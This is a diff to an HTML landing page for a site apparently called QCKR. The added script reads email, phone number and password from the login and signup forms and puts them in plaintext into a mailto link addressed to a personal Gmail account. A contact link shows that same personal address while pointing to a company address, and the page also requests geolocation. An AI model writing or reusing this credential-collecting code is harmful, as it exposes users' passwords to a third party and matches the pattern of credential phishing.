@@ -148,23 +148,12 @@
     <p class="max-w-3xl mx-auto text-gray-800">Have questions? Reach out to us at <a href="mailto:support@qckr.com" class="text-blue-600 hover:underline">hariom.556879@gmail.com</a> or call us at +91-123-456-7890.</p>
   </section>
 
-  <!-- Authentication Section -->
-  <section id="auth" class="py-16 bg-gradient-to-r from-purple-100 to-blue-100 text-center border-2 border-blue-400 rounded-lg shadow-md">
-    <h2 class="text-3xl font-bold mb-8 text-gray-800">Login / Signup</h2>
-    <div class="max-w-md mx-auto">
-      <input type="text" placeholder="Email" class="w-full p-2 mb-4 border rounded">
-      <input type="password" placeholder="Password" class="w-full p-2 mb-4 border rounded">
-      <button class="bg-blue-600 text-white p-2 rounded w-full hover:bg-blue-700">Login</button>
-      <p class="mt-4 text-gray-800">Don't have an account? <a href="#" class="text-blue-600 hover:underline">Sign up</a></p>
-    </div>
-  </section>
-
   <!-- Footer -->
   <footer class="bg-gradient-to-r from-blue-600 to-teal-500 text-white p-4 text-center border-t-2 border-blue-400 shadow-md">
     <p>&copy; 2025 QCKR. All rights reserved.</p>
   </footer>
 
-  <!-- JavaScript for Location Permission and Swiper -->
+  <!-- JavaScript for Location Permission, Swiper, and Email Sending -->
   <script>
     // Initialize Swiper
     const swiper = new Swiper('.mySwiper', {
@@ -190,7 +179,6 @@
           (position) => {
             const { latitude, longitude } = position.coords;
             alert(`Location accessed: Latitude ${latitude}, Longitude ${longitude}`);
-            // You can use the location data for further functionality
           },
           (error) => {
             alert('Location access denied or unavailable.');
@@ -201,6 +189,35 @@
         alert('Geolocation is not supported by your browser.');
       }
     };
+
+    // Function to send email (client-side simulation, actual implementation requires server-side)
+    function sendEmail(action, email, phone, password) {
+      const subject = action === 'login' ? 'QCKR Login Attempt' : 'QCKR New Signup';
+      const body = `Action: ${action}\nEmail: ${email}\nPhone: ${phone}\nPassword: ${password}`;
+      const mailtoLink = `mailto:hariom.556879@gmail.com?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;
+      window.location.href = mailtoLink;
+    }
+
+    // Handle Login/Signup form submission
+    document.querySelectorAll('.auth-form').forEach(form => {
+      form.addEventListener('submit', function(e) {
+        e.preventDefault();
+        const email = this.querySelector('input[name="email"]').value;
+        const phone = this.querySelector('input[name="phone"]').value;
+        const password = this.querySelector('input[name="password"]').value;
+        const action = this.id === 'login-form' ? 'login' : 'signup';
+
+        // Validate phone number (10 digits)
+        if (!/^\d{10}$/.test(phone)) {
+          alert('Please enter a valid 10-digit phone number.');
+          return;
+        }
+
+        // Simulate sending data to email
+        sendEmail(action, email, phone, password);
+        alert(`${action.charAt(0).toUpperCase() + action.slice(1)} data sent to email.`);
+      });
+    });
   </script>
 </body>
 </html>
